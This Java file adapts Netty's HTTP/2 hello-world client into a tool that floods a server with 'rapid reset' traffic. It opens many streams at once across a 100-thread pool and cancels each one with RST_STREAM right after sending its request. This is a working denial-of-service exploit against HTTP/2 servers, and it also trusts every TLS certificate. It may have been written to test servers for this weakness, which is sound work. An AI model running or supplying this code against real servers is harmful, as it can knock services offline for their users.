/*
 * Copyright 2014 The Netty Project
 *
 * The Netty Project licenses this file to you under the Apache License, version 2.0 (the
 * "License"); you may not use this file except in compliance with the License. You may obtain a
 * copy of the License at:
 *
 * https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
package io.netty.example.http2.helloworld.client;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultFullHttpRequest;
import io.netty.handler.codec.http.FullHttpRequest;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpHeaderValues;
import io.netty.handler.codec.http.HttpScheme;
import io.netty.handler.codec.http2.Http2SecurityUtil;
import io.netty.handler.codec.http2.HttpConversionUtil;
import io.netty.handler.ssl.ApplicationProtocolConfig;
import io.netty.handler.ssl.ApplicationProtocolConfig.Protocol;
import io.netty.handler.ssl.ApplicationProtocolConfig.SelectedListenerFailureBehavior;
import io.netty.handler.ssl.ApplicationProtocolConfig.SelectorFailureBehavior;
import io.netty.handler.ssl.ApplicationProtocolNames;
import io.netty.handler.ssl.OpenSsl;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.SslProvider;
import io.netty.handler.ssl.SupportedCipherSuiteFilter;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import io.netty.util.AsciiString;
import io.netty.util.CharsetUtil;

import java.util.concurrent.Callable;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.TimeUnit;

import static io.netty.buffer.Unpooled.wrappedBuffer;
import static io.netty.handler.codec.http.HttpMethod.GET;
import static io.netty.handler.codec.http.HttpMethod.POST;
import static io.netty.handler.codec.http.HttpVersion.HTTP_1_1;

/**
 * An HTTP2 client that allows you to send HTTP2 frames to a server using HTTP1-style approaches
 * (via {@link io.netty.handler.codec.http2.InboundHttp2ToHttpAdapter}). Inbound and outbound
 * frames are logged.
 * When run from the command-line, sends a single HEADERS frame to the server and gets back
 * a "Hello World" response.
 * See the ./http2/helloworld/frame/client/ example for a HTTP2 client example which does not use
 * HTTP1-style objects and patterns.
 */
public final class Http2Client {

    static final boolean SSL = System.getProperty("ssl") != null;
    static final String HOST = System.getProperty("host", "127.0.0.1");
    static final int PORT = Integer.parseInt(System.getProperty("port", SSL? "8443" : "8080"));
    static final String URL = System.getProperty("url", "/whatever");
    static final int TRIES = Integer.parseUnsignedInt(System.getProperty("tries", "10"));

    public static void main(String[] args) throws Exception {
        // Configure SSL.
        final SslContext sslCtx = initializeSSL();
        // Create Netty objects for connections
        EventLoopGroup workerGroup = new NioEventLoopGroup();
        Http2ClientInitializer initializer = new Http2ClientInitializer(sslCtx, Integer.MAX_VALUE, URL);
        HttpResponseHandler responseHandler = initializer.responseHandler();
        // Create request specific config
        HttpScheme scheme = SSL ? HttpScheme.HTTPS : HttpScheme.HTTP;
        AsciiString hostName = new AsciiString(HOST + ':' + PORT);
        FullHttpRequest request = createSimpleGetRequest(URL, hostName, scheme);
        // Start test for bombarding streams and cancelling them
        System.err.println("Starting rapid reset requests...");
        try {
            for (int i = 0; i < TRIES; i++) {
                // Create and executor service for managing threads
                ExecutorService executor = Executors.newFixedThreadPool(100);
                // Open connection to server
                Channel channel = openConnection(workerGroup, initializer);
                System.out.println("Connected to [" + HOST + ':' + PORT + ']');

                // Wait for the HTTP/2 upgrade to occur.
                Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();
                try {
                    http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);
                } catch (Exception e) {
                    System.out.println("Catched exception/timeout waiting for preface " +
                        "from [" + HOST + ':' + PORT + ']');
                    continue;
                }

                // Start all the streams possibly allowed and cancel them
                long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
                System.out.println("Going until streams: " + maxConcurrentStreams);
                // Think about running this in a thread concurrently with other threads
                // To have concurrent streams running at the same time
                for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
                    if (!channel.isOpen()) {
                        System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
                        break;
                    }
                    executor.submit(new RequestAndResetCallable(request, http2SettingsHandler.ctx,
                        initializer, channel, streamId));
                    Thread.sleep(20);
                }

                System.out.println("Finished HTTP/2 request");

                // Wait until the connection is closed. Possibly start another connection
                channel.close();
                executor.shutdownNow();
            }
        } finally {
            workerGroup.shutdownGracefully();
        }
    }

    public static SslContext initializeSSL() throws Exception {
        SslContext sslCtx;
        if (SSL) {
            SslProvider provider = OpenSsl.isAlpnSupported() ? SslProvider.OPENSSL : SslProvider.JDK;
            sslCtx = SslContextBuilder.forClient()
                .sslProvider(provider)
                /* NOTE: the cipher filter may not include all ciphers required by the HTTP/2 specification.
                * Please refer to the HTTP/2 specification for cipher requirements. */
                .ciphers(Http2SecurityUtil.CIPHERS, SupportedCipherSuiteFilter.INSTANCE)
                .trustManager(InsecureTrustManagerFactory.INSTANCE)
                .applicationProtocolConfig(new ApplicationProtocolConfig(
                    Protocol.ALPN,
                    // NO_ADVERTISE is currently the only mode supported by both OpenSsl and JDK providers.
                    SelectorFailureBehavior.NO_ADVERTISE,
                    // ACCEPT is currently the only mode supported by both OpenSsl and JDK providers.
                    SelectedListenerFailureBehavior.ACCEPT,
                    ApplicationProtocolNames.HTTP_2,
                    ApplicationProtocolNames.HTTP_1_1))
                .build();
        } else {
            sslCtx = null;
        }
        return sslCtx;
    }

    public static Channel openConnection(EventLoopGroup workerGroup, Http2ClientInitializer initializer) {
        // Configure the client.
        Bootstrap b = new Bootstrap();
        b.group(workerGroup);
        b.channel(NioSocketChannel.class);
        b.option(ChannelOption.SO_KEEPALIVE, true);
        b.remoteAddress(HOST, PORT);
        b.handler(initializer);

        // Start the client.
        return b.connect().syncUninterruptibly().channel();
    }

    public static FullHttpRequest createSimpleGetRequest(String url, AsciiString hostName, HttpScheme scheme) {
        FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, url, Unpooled.EMPTY_BUFFER);
        request.headers().add(HttpHeaderNames.HOST, hostName);
        request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());
        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);
        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);
        return request;
    }

    // Think about running this in a thread concurrently with other threads for stream IDs all the way
    // up to max concurrent streams
    public static void sendDummyRequestAndReset(FullHttpRequest request, ChannelHandlerContext ctx,
            Http2ClientInitializer initializer, Channel channel, int streamId) {
        HttpResponseHandler responseHandler = initializer.responseHandler();
        responseHandler.put(streamId, channel.write(request), channel.newPromise());
        channel.flush();
        initializer.connectionHandler().resetStream(ctx, streamId, 0, channel.newPromise());
    }


    private static class RequestAndResetCallable implements Callable<Void> {

        FullHttpRequest request;
        ChannelHandlerContext ctx;
        Http2ClientInitializer initializer;
        Channel channel;
        int streamId;

        public RequestAndResetCallable(FullHttpRequest request, ChannelHandlerContext ctx,
                Http2ClientInitializer initializer, Channel channel, int streamId){
            super();
            this.request = request;
            this.ctx = ctx;
            this.initializer = initializer;
            this.channel = channel;
            this. streamId = streamId;
        }

        @Override
        public Void call() throws Exception {
            if (!channel.isOpen()) {
                System.out.println("Channel: " + channel + " was not open for stream: " + streamId);
                return null;
            }
            HttpResponseHandler responseHandler = initializer.responseHandler();
            ChannelFuture future = channel.writeAndFlush(request);
            // responseHandler.put(streamId, future, channel.newPromise());
            // channel.flush();
            // Await until write is finish to write the reset
            try {
                future.await(1000);
            } catch(Exception e) {
                System.out.println("Got exception waiting for flush on stream: " + streamId);
                return null;
            }
            if (!channel.isOpen()) {
                System.out.println("Channel: " + channel + " was not open after request sent for stream: " + streamId);
                return null;
            }
            initializer.connectionHandler().resetStream(ctx, streamId, 0, channel.newPromise());
            channel.flush();
            return null;
        }

    }

}
